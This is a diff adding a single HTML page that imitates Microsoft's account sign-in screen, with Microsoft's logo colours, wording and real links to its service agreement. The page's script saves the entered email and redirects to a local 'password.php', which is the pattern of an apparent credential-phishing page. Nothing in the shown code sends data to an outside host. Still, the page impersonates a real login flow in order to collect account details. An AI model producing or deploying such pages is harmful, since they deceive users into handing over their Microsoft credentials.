@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Let's add your Microsoft account</title>
+  <style>
+    :root {
+      --primary: #0078d4;
+      --primary-hover: #106ebe;
+      --text: #333;
+      --light-gray: #f3f2f1;
+      --border: #ccc;
+      --link: #0067b8;
+      --link-hover: #005a9e;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      color: var(--text);
+      line-height: 1.6;
+      padding: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 450px;
+      padding: 2rem;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      background: #fff;
+    }
+
+    .header {
+      margin-bottom: 1.5rem;
+    }
+
+    .header h1 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 1rem;
+    }
+
+    .microsoft-logo {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .microsoft-logo .square {
+      width: 20px;
+      height: 20px;
+      margin-right: 8px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+    }
+
+    .microsoft-logo .square div {
+      border-radius: 2px;
+    }
+
+    .microsoft-logo .square div:nth-child(1) { background: #f25022; }
+    .microsoft-logo .square div:nth-child(2) { background: #7fba00; }
+    .microsoft-logo .square div:nth-child(3) { background: #00a4ef; }
+    .microsoft-logo .square div:nth-child(4) { background: #ffb900; }
+
+    .microsoft-logo span {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #555;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      font-size: 1rem;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+    }
+
+    .input-field::placeholder {
+      color: #999;
+    }
+
+    .help-links {
+      margin: 1rem 0;
+      font-size: 0.9rem;
+    }
+
+    .help-links a {
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .help-links a:hover {
+      color: var(--link-hover);
+      text-decoration: underline;
+    }
+
+    .sign-in-options {
+      margin: 1rem 0;
+      font-size: 0.9rem;
+    }
+
+    .sign-in-options a {
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .sign-in-options a:hover {
+      text-decoration: underline;
+    }
+
+    .agreement {
+      font-size: 0.85rem;
+      color: #666;
+      margin-top: 1rem;
+    }
+
+    .agreement a {
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .agreement a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 2rem;
+    }
+
+    .btn {
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: 600;
+      transition: background-color 0.2s ease;
+    }
+
+    .btn-back {
+      background: transparent;
+      color: var(--link);
+      border: 1px solid var(--border);
+    }
+
+    .btn-back:hover {
+      background: var(--light-gray);
+    }
+
+    .btn-next {
+      background: var(--primary);
+      color: white;
+    }
+
+    .btn-next:hover {
+      background: var(--primary-hover);
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 1.5rem;
+        margin: 0 1rem;
+      }
+
+      .header h1 {
+        font-size: 1.5rem;
+      }
+
+      .btn {
+        padding: 0.75rem 1rem;
+        font-size: 0.95rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Let's add your Microsoft account</h1>
+      <div class="microsoft-logo">
+        <div class="square">
+          <div></div><div></div>
+          <div></div><div></div>
+        </div>
+        <span>Microsoft</span>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="signin-input">Sign in</label>
+      <div class="input-wrapper">
+        <input 
+          type="text" 
+          id="signin-input" 
+          class="input-field" 
+          placeholder="Email, phone, or Skype"
+          autocomplete="username"
+        />
+      </div>
+    </div>
+
+    <div class="help-links">
+      No account? <a href="#" id="create-account">Create one!</a>
+    </div>
+
+    <div class="sign-in-options">
+      <a href="#" id="sign-in-options">Sign-in options</a>
+    </div>
+
+    <div class="agreement">
+      Choosing <strong>Next</strong> means that you agree to the 
+      <a href="https://www.microsoft.com/en-us/servicesagreement/" target="_blank">Microsoft Services Agreement</a> 
+      and <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank">privacy and cookies statement</a>.
+    </div>
+
+    <div class="footer">
+      <button class="btn btn-back" id="back-btn">Back</button>
+      <button class="btn btn-next" id="next-btn">Next</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('next-btn').addEventListener('click', function() {
+      const email = document.getElementById('signin-input').value.trim();
+      if (!email) {
+        alert("Please enter your email, phone, or Skype.");
+        return;
+      }
+      localStorage.setItem('userEmail', email);
+      window.location.href = 'password.php';
+    });
+
+    document.getElementById('create-account').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert("Redirecting to account creation page...");
+    });
+
+    document.getElementById('sign-in-options').addEventListener('click', function(e) {
+      e.preventDefault();
+      alert("Showing alternative sign-in methods...");
+    });
+
+    document.getElementById('back-btn').addEventListener('click', function() {
+      alert("Going back...");
+    });
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('signin-input').focus();
+    });
+  </script>
+</body>
+</html>
